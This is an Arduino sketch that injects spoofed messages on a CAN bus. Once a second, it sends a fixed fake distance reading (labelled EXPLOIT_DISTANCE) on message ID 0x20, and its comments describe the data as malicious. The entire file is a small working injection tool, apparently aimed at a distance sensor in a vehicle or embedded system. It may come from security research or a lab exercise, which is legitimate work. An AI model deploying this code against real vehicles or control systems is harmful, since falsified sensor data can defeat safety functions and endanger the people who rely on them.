#include <CAN.h>

// Constants
const int LOOP_DELAY_MS = 1000;
const long CAN_SPEED = 500E3;
const long g_canID   = 0x20; //32 in decimal
const long EXPLOIT_DISTANCE = 1000;

// Globals
bool g_canActive = false;

void initCAN(); // used in the setup() function
void sendDistanceOverCAN(uint16_t distance);

void setup() {
  Serial.begin(9600);
  while (!Serial);

  Serial.println("CAN Distance Sender");
  initCAN(); // initializes can
}

// main loop that constantly sends the malious distance with a set delay
void loop() {
  if (!g_canActive) {
    initCAN(); // checks if can is active and intializes it
  }

  uint16_t distance = EXPLOIT_DISTANCE; // sets the distance to exploit distance defined above
  sendDistanceOverCAN(distance);

  delay(LOOP_DELAY_MS);
}

// the steps initCAN takes
void initCAN() {
  if (!CAN.begin(CAN_SPEED)) {
    Serial.println("Starting CAN failed!");
    g_canActive = false;
  } else {
    Serial.println("CAN started successfully");
    g_canActive = true;
  }
}

// the actual function that sends the malicous data
void sendDistanceOverCAN(uint16_t distance) {
  byte canData[2] = {0};
  canData[0] = distance & 0xFF;        
  canData[1] = (distance >> 8) & 0xFF; 

  if (!CAN.beginPacket(g_canID, 2, false)) {
    Serial.println("CAN begin failed");
    g_canActive = false;
  } else if (!CAN.write(canData, 2)) {
    Serial.println("CAN write failed");
    g_canActive = false;
  } else if (!CAN.endPacket()) {
    Serial.println("CAN end failed");
    Serial.print("CAN dlc: ");
    //Serial.println(dlc);
    g_canActive = false;
  } else {
    Serial.println("CAN packet sent successfully");
    Serial.print("Sent Data: [0x");
    Serial.print(canData[0], HEX);
    Serial.print(", 0x");
    Serial.print(canData[1], HEX);
    Serial.println("]");
  }
}